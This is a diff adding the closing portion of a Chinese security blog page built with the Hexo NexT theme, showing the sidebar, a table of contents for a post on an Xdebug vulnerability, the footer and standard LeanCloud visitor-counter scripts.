+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="l1nk3r" />
+            
+              <p class="site-author-name" itemprop="name">l1nk3r</p>
+              <p class="site-description motion-element" itemprop="description">愿你出走半生，归来仍是少年</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sukaralin" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sukaralin@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/SukaraLin" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-写在前面"><span class="nav-text">0x01 写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-进入正题"><span class="nav-text">0x02 进入正题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Xdebug工作原理"><span class="nav-text">Xdebug工作原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些技巧"><span class="nav-text">一些技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一种"><span class="nav-text">第一种</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二种"><span class="nav-text">第二种</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-总结"><span class="nav-text">0x03 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refer"><span class="nav-text">Refer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">l1nk3r</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+    
+      <!-- custom analytics part create by xiamo -->
+<script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+<script>AV.initialize("UK6XjHUbz1agzT32wU9TCYHNH-gzGzoHsz", "Qok6iqgiGgI7g4lDx8MdQVEu");</script>
+<script>
+function showTime(Counter) {
+	var query = new AV.Query(Counter);
+	$(".leancloud_visitors").each(function() {
+		var url = $(this).attr("id").trim();
+		query.equalTo("url", url);
+		query.find({
+			success: function(results) {
+				if (results.length == 0) {
+					var content = '0 ' + $(document.getElementById(url)).text();
+					$(document.getElementById(url)).text(content);
+					return;
+				}
+				for (var i = 0; i < results.length; i++) {
+					var object = results[i];
+					var content = object.get('time') + ' ' + $(document.getElementById(url)).text();
+					$(document.getElementById(url)).text(content);
+				}
+			},
+			error: function(object, error) {
+				console.log("Error: " + error.code + " " + error.message);
+			}
+		});
+
+	});
+}
+
+function addCount(Counter) {
+	var Counter = AV.Object.extend("Counter");
+	url = $(".leancloud_visitors").attr('id').trim();
+	title = $(".leancloud_visitors").attr('data-flag-title').trim();
+	var query = new AV.Query(Counter);
+	query.equalTo("url", url);
+	query.find({
+		success: function(results) {
+			if (results.length > 0) {
+				var counter = results[0];
+				counter.fetchWhenSave(true);
+				counter.increment("time");
+				counter.save(null, {
+					success: function(counter) {
+						var content =  counter.get('time') + ' ' + $(document.getElementById(url)).text();
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(counter, error) {
+						console.log('Failed to save Visitor num, with error message: ' + error.message);
+					}
+				});
+			} else {
+				var newcounter = new Counter();
+				newcounter.set("title", title);
+				newcounter.set("url", url);
+				newcounter.set("time", 1);
+				newcounter.save(null, {
+					success: function(newcounter) {
+					    console.log("newcounter.get('time')="+newcounter.get('time'));
+						var content = newcounter.get('time') + ' ' + $(document.getElementById(url)).text();
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(newcounter, error) {
+						console.log('Failed to create');
+					}
+				});
+			}
+		},
+		error: function(error) {
+			console.log('Error:' + error.code + " " + error.message);
+		}
+	});
+}
+$(function() {
+	var Counter = AV.Object.extend("Counter");
+	if ($('.leancloud_visitors').length == 1) {
+		addCount(Counter);
+	} else if ($('.post-title-link').length > 1) {
+		showTime(Counter);
+	}
+}); 
+</script>
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("UK6XjHUbz1agzT32wU9TCYHNH-gzGzoHsz", "Qok6iqgiGgI7g4lDx8MdQVEu");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
